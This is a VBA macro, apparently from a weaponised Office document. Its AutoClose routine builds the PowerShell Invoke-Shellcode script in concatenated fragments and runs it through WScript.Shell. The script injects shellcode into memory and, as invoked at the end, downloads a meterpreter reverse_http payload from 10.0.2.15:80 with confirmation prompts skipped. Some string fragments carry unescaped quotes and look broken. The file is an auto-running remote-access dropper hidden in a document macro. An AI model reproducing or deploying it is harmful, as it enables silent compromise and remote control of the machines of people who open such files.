Sub AutoClose()
        A
End Sub

Public Function A() As Variant
        Dim I As String
        I = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        I = I + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        I = I + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        I = I + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        I = I + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        I = I + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        I = I + "    $Shellcode,
    [Parameter( ParameterSetName ="
        I = I + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        I = I + "reter/reverse_http',
                  'windows/me"
        I = I + "terpreter/reverse_https',
                  Ignore"
        I = I + "Case = $True )]
    [String]
    $Payload = 'windo"
        I = I + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        I = I + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        I = I + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        I = I + " = $True,
                ParameterSetName = 'Meta"
        I = I + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        I = I + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        I = I + "datory = $True,
                ParameterSetName ="
        I = I + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        I = I + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        I = I + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        I = I + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        I = I + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        I = I + "sion\Internet Settings').'User Agent',
    [Parame"
        I = I + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        I = I + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        I = I + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        I = I + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        I = I + "$False,
    [Switch]
    $Force = $False
)
    Set"
        I = I + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        I = I + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        I = I + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        I = I + "meters['Payload'].Attributes |
            Where-O"
        I = I + "bject {$_.TypeId -eq [System.Management.Automation"
        I = I + ".ValidateSetAttribute]}
        foreach ($Payload "
        I = I + "in $AvailablePayloads.ValidValues)
        {
     "
        I = I + "       New-Object PSObject -Property @{ Payloads ="
        I = I + " $Payload }
        }
        Return
    }
    if "
        I = I + "( $PSBoundParameters['ProcessID'] )
    {
        "
        I = I + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        I = I + "-Null
    }
    function Local:Get-DelegateType
  "
        I = I + "  {
        Param
        (
            [OutputTyp"
        I = I + "e([Type])]
            [Parameter( Position = 0)]
"
        I = I + "            [Type[]]
            $Parameters = (Ne"
        I = I + "w-Object Type[](0)),
            [Parameter( Posit"
        I = I + "ion = 1 )]
            [Type]
            $ReturnT"
        I = I + "ype = [Void]
        )
        $Domain = [AppDomai"
        I = I + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        I = I + "t System.Reflection.AssemblyName('ReflectedDelegat"
        I = I + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        I = I + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        I = I + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        I = I + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        I = I + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        I = I + "der.DefineType('MyDelegateType', 'Class, Public, S"
        I = I + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        I = I + "egate])
        $ConstructorBuilder = $TypeBuilder"
        I = I + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        I = I + "ic', [System.Reflection.CallingConventions]::Stand"
        I = I + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        I = I + "mplementationFlags('Runtime, Managed')
        $Me"
        I = I + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        I = I + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        I = I + ", $Parameters)
        $MethodBuilder.SetImplement"
        I = I + "ationFlags('Runtime, Managed')
        Write-Outpu"
        I = I + "t $TypeBuilder.CreateType()
    }
    function Loc"
        I = I + "al:Get-ProcAddress
    {
        Param
        (
 "
        I = I + "           [OutputType([IntPtr])]
            [Par"
        I = I + "ameter( Position = 0, Mandatory = $True )]
       "
        I = I + "     [String]
            $Module,
            [Pa"
        I = I + "rameter( Position = 1, Mandatory = $True )]
      "
        I = I + "      [String]
            $Procedure
        )
  "
        I = I + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        I = I + ".GetAssemblies() |
            Where-Object { $_.G"
        I = I + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        I = I + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        I = I + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        I = I + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        I = I + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        I = I + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        I = I + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        I = I + "eropServices.HandleRef], [String]))
        $Kern3"
        I = I + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        I = I + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        I = I + "ndleRef = New-Object System.Runtime.InteropService"
        I = I + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        I = I + "Output $GetProcAddress.Invoke($null, @([System.Run"
        I = I + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        I = I + "ure))
    }
    function Local:Emit-CallThreadStub"
        I = I + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        I = I + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        I = I + "chitecture / 8
        function Local:ConvertTo-Li"
        I = I + "ttleEndian ([IntPtr] $Address)
        {
         "
        I = I + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        I = I + "           $Address.ToString("X$($IntSizePtr*2)") "
        I = I + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        I = I + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        I = I + " } }
            [System.Array]::Reverse($LittleEn"
        I = I + "dianByteArray)
            Write-Output $LittleEnd"
        I = I + "ianByteArray
        }
        $CallStub = New-Obj"
        I = I + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        I = I + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        I = I + "                   # MOV   QWORD RAX, &shellcode
 "
        I = I + "           $CallStub += ConvertTo-LittleEndian $Ba"
        I = I + "seAddr       # &shellcode
            $CallStub +="
        I = I + " 0xFF,0xD0                              # CALL  RA"
        I = I + "X
            $CallStub += 0x6A,0x00              "
        I = I + "                # PUSH  BYTE 0
            $CallSt"
        I = I + "ub += 0x48,0xB8                              # MOV"
        I = I + "   QWORD RAX, &ExitThread
            $CallStub +="
        I = I + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        I = I + "ead
            $CallStub += 0xFF,0xD0            "
        I = I + "                  # CALL  RAX
        }
        el"
        I = I + "se
        {
            [Byte[]] $CallStub = 0xB8"
        I = I + "                           # MOV   DWORD EAX, &she"
        I = I + "llcode
            $CallStub += ConvertTo-LittleEn"
        I = I + "dian $BaseAddr       # &shellcode
            $Cal"
        I = I + "lStub += 0xFF,0xD0                              # "
        I = I + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        I = I + "                        # PUSH  BYTE 0
           "
        I = I + " $CallStub += 0xB8                                "
        I = I + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        I = I + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        I = I + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        I = I + "                          # CALL  EAX
        }
  "
        I = I + "      Write-Output $CallStub
    }
    function Lo"
        I = I + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        I = I + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        I = I + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        I = I + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        I = I + "        Throw "Unable to open a process handle for"
        I = I + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        I = I + "lse
        if ($64bitCPU) # Only perform theses c"
        I = I + "hecks if CPU is 64-bit
        {
            $IsWo"
        I = I + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        I = I + "-Null
            if ((!$IsWow64) -and $PowerShell"
        I = I + "32bit)
            {
                Throw 'Unable"
        I = I + " to inject 64-bit shellcode from within 32-bit Pow"
        I = I + "ershell. Use the 64-bit version of Powershell if y"
        I = I + "ou want this to work.'
            }
            e"
        I = I + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        I = I + "  {
                if ($Shellcode32.Length -eq 0)"
        I = I + "
                {
                    Throw 'No s"
        I = I + "hellcode was placed in the $Shellcode32 variable!'"
        I = I + "
                }
                $Shellcode = $S"
        I = I + "hellcode32
            }
            else # 64-bit"
        I = I + " process
            {
                if ($Shellc"
        I = I + "ode64.Length -eq 0)
                {
            "
        I = I + "        Throw 'No shellcode was placed in the $She"
        I = I + "llcode64 variable!'
                }
            "
        I = I + "    $Shellcode = $Shellcode64
            }
      "
        I = I + "  }
        else # 32-bit CPU
        {
          "
        I = I + "  if ($Shellcode32.Length -eq 0)
            {
   "
        I = I + "             Throw 'No shellcode was placed in the"
        I = I + " $Shellcode32 variable!'
            }
           "
        I = I + " $Shellcode = $Shellcode32
        }
        $Remo"
        I = I + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        I = I + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        I = I + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        I = I + ")
        {
            Throw "Unable to allocate "
        I = I + "shellcode memory in PID: $ProcessID"
        }
   "
        I = I + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        I = I + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        I = I + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        I = I + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        I = I + "      {
            $CallStub = Emit-CallThreadStu"
        I = I + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        I = I + "    else
        {
            $CallStub = Emit-Ca"
        I = I + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        I = I + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        I = I + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        I = I + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        I = I + "(!$RemoteStubAddr)
        {
            Throw "Un"
        I = I + "able to allocate thread call stub memory in PID: $"
        I = I + "ProcessID"
        }
        $WriteProcessMemory.I"
        I = I + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        I = I + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        I = I + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        I = I + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        I = I + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        I = I + "  {
            Throw "Unable to launch remote thr"
        I = I + "ead in PID: $ProcessID"
        }
        $CloseHa"
        I = I + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        I = I + "on Local:Inject-LocalShellcode
    {
        if ($"
        I = I + "PowerShell32bit) {
            if ($Shellcode32.Le"
        I = I + "ngth -eq 0)
            {
                Throw 'N"
        I = I + "o shellcode was placed in the $Shellcode32 variabl"
        I = I + "e!'
                return
            }
         "
        I = I + "   $Shellcode = $Shellcode32
        }
        els"
        I = I + "e
        {
            if ($Shellcode64.Length -e"
        I = I + "q 0)
            {
                Throw 'No shell"
        I = I + "code was placed in the $Shellcode64 variable!'
   "
        I = I + "             return
            }
            $She"
        I = I + "llcode = $Shellcode64
        }
        $BaseAddre"
        I = I + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        I = I + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        I = I + "X)
        if (!$BaseAddress)
        {
          "
        I = I + "  Throw "Unable to allocate shellcode memory in PI"
        I = I + "D: $ProcessID"
        }
        [System.Runtime.I"
        I = I + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        I = I + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        I = I + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        I = I + "  if ($PowerShell32bit)
        {
            $Cal"
        I = I + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        I = I + "adAddr 32
        }
        else
        {
       "
        I = I + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        I = I + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        I = I + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        I = I + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        I = I + "X)
        if (!$CallStubAddress)
        {
      "
        I = I + "      Throw "Unable to allocate thread call stub.""
        I = I + "
        }
        [System.Runtime.InteropServices"
        I = I + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        I = I + "allStub.Length)
        $ThreadHandle = $CreateThr"
        I = I + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        I = I + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        I = I + "dHandle)
        {
            Throw "Unable to la"
        I = I + "unch thread."
        }
        $WaitForSingleObje"
        I = I + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        I = I + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        I = I + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        I = I + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        I = I + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        I = I + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        I = I + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        I = I + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        I = I + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        I = I + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        I = I + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        I = I + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        I = I + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        I = I + "  else
    {
        $64bitCPU = $false
    }
    "
        I = I + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        I = I + "l32bit = $true
    }
    else
    {
        $Power"
        I = I + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        I = I + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        I = I + "owerShell32bit) {
            $RootInvocation = $M"
        I = I + "yInvocation.Line
            $Response = $True
   "
        I = I + "         if ( $Force -or ( $Response = $psCmdlet.S"
        I = I + "houldContinue( "Do you want to launch the payload "
        I = I + "from x86 Powershell?",
                   "Attempt"
        I = I + " to execute 32-bit shellcode from 64-bit Powershel"
        I = I + "l. Note: This process takes about one minute. Be p"
        I = I + "atient! You will also see some artifacts of the sc"
        I = I + "ript loading in the other process." ) ) ) { }
    "
        I = I + "        if ( !$Response )
            {
          "
        I = I + "      Return
            }
            if ($MyInvo"
        I = I + "cation.BoundParameters['Force'])
            {
   "
        I = I + "             $Command = "function $($MyInvocation."
        I = I + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        I = I + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        I = I + "   }
            else
            {
              "
        I = I + "  $Command = "function $($MyInvocation.InvocationN"
        I = I + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        I = I + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        I = I + "
            $CommandBytes = [System.Text.Encoding"
        I = I + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        I = I + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        I = I + "           $Execute = '$Command' + " | $Env:windir"
        I = I + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        I = I + "oProfile -Command -"
            Invoke-Expression"
        I = I + " -Command $Execute | Out-Null
            Return
 "
        I = I + "       }
        $Response = $True
        if ( $F"
        I = I + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        I = I + "Do you know what you're doing?",
               "A"
        I = I + "bout to download Metasploit payload '$($Payload)' "
        I = I + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        I = I + "  if ( !$Response )
        {
            Return
 "
        I = I + "       }
        switch ($Payload)
        {
     "
        I = I + "       'windows/meterpreter/reverse_http'
        "
        I = I + "    {
                $SSL = ''
            }
    "
        I = I + "        'windows/meterpreter/reverse_https'
      "
        I = I + "      {
                $SSL = 's'
               "
        I = I + " [System.Net.ServicePointManager]::ServerCertifica"
        I = I + "teValidationCallback = {$True}
            }
     "
        I = I + "   }
        if ($Legacy)
        {
            $R"
        I = I + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        I = I + "
        } else {
            $CharArray = 48..57 "
        I = I + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        I = I + "         $SumTest = $False
            while ($Sum"
        I = I + "Test -eq $False)
            {
                $Ge"
        I = I + "neratedUri = $CharArray | Get-Random -Count 4
    "
        I = I + "            $SumTest = (([int[]] $GeneratedUri | M"
        I = I + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        I = I + "  }
            $RequestUri = -join $GeneratedUri
"
        I = I + "            $Request = "http$($SSL)://$($Lhost):$("
        I = I + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        I = I + "ew-Object Uri($Request)
        $WebClient = New-O"
        I = I + "bject System.Net.WebClient
        $WebClient.Head"
        I = I + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        I = I + "roxy)
        {
            $WebProxyObject = New-"
        I = I + "Object System.Net.WebProxy
            $ProxyAddre"
        I = I + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        I = I + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        I = I + "oxyServer
            if ($ProxyAddress)
         "
        I = I + "   {
                $WebProxyObject.Address = $Pr"
        I = I + "oxyAddress
                $WebProxyObject.UseDefa"
        I = I + "ultCredentials = $True
                $WebClientO"
        I = I + "bject.Proxy = $WebProxyObject
            }
      "
        I = I + "  }
        try
        {
            [Byte[]] $Sh"
        I = I + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        I = I + "}
        catch
        {
            Throw "$($Er"
        I = I + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        I = I + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        I = I + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        I = I + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        I = I + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        I = I + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        I = I + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        I = I + "                             0x52,0x0c,0x8b,0x52,0"
        I = I + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        I = I + "x31,0xc0,
                                  0xac,0"
        I = I + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        I = I + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        I = I + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        I = I + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        I = I + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        I = I + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        I = I + "x8b,
                                  0x01,0xd6,0"
        I = I + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        I = I + "x38,0xe0,0x75,0xf4,
                              "
        I = I + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        I = I + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        I = I + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        I = I + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        I = I + "                                  0x5b,0x5b,0x61,0"
        I = I + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        I = I + "xeb,0x86,0x5d,
                                  0"
        I = I + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        I = I + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        I = I + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        I = I + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        I = I + "                             0x80,0xfb,0xe0,0x75,0"
        I = I + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        I = I + "xd5,0x63,
                                  0x61,0"
        I = I + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        I = I + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        I = I + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        I = I + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        I = I + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        I = I + "                             0x20,0x48,0x8b,0x72,0"
        I = I + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        I = I + "x31,0xc0,
                                  0xac,0"
        I = I + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        I = I + "x41,0x01,0xc1,0xe2,0xed,
                         "
        I = I + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        I = I + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        I = I + "                        0x00,0x00,0x00,0x48,0x85,0"
        I = I + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        I = I + "x44,
                                  0x8b,0x40,0"
        I = I + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        I = I + "x8b,0x34,0x88,0x48,
                              "
        I = I + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        I = I + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        I = I + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        I = I + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        I = I + "                                  0x8b,0x40,0x24,0"
        I = I + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        I = I + "x40,0x1c,0x49,
                                  0"
        I = I + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        I = I + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        I = I + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        I = I + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        I = I + "                             0x59,0x5a,0x48,0x8b,0"
        I = I + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        I = I + "x00,0x00,
                                  0x00,0"
        I = I + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        I = I + "x00,0x41,0xba,0x31,0x8b,
                         "
        I = I + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        I = I + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        I = I + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        I = I + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        I = I + "x47,
                                  0x13,0x72,0"
        I = I + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        I = I + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        I = I + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        I = I + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        I = I + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        I = I + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        I = I + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        I = I + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        I = I + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        I = I + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        I = I + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        I = I + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        I = I + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        I = I + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        I = I + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        I = I + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        I = I + "ernel32.dll WriteProcessMemory
        $WriteProce"
        I = I + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        I = I + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        I = I + "()) ([Bool])
        $WriteProcessMemory = [System"
        I = I + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        I = I + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        I = I + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        I = I + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        I = I + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        I = I + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        I = I + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        I = I + "eateRemoteThread = [System.Runtime.InteropServices"
        I = I + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        I = I + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        I = I + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        I = I + " CloseHandle
        $CloseHandleDelegate = Get-De"
        I = I + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        I = I + "le = [System.Runtime.InteropServices.Marshal]::Get"
        I = I + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        I = I + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        I = I + ".ShouldContinue( 'Do you wish to carry out your ev"
        I = I + "il plans?',
                 "Injecting shellcode "
        I = I + "injecting into $((Get-Process -Id $ProcessId).Proc"
        I = I + "essName) ($ProcessId)!" ) )
        {
            "
        I = I + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        I = I + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        I = I + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        I = I + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        I = I + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        I = I + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        I = I + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        I = I + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        I = I + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        I = I + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        I = I + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        I = I + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        I = I + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        I = I + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        I = I + "rocAddress kernel32.dll CreateThread
        $Crea"
        I = I + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        I = I + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        I = I + "IntPtr])
        $CreateThread = [System.Runtime.I"
        I = I + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        I = I + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        I = I + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        I = I + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        I = I + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        I = I + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        I = I + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        I = I + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        I = I + "ForSingleObjectDelegate)
        if ( $Force -or $"
        I = I + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        I = I + " your evil plans?',
                 "Injecting sh"
        I = I + "ellcode into the running PowerShell process!" ) )
"
        I = I + "        {
            Inject-LocalShellcode
      "
        I = I + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        I = I + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        I = I + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(I)
End Function
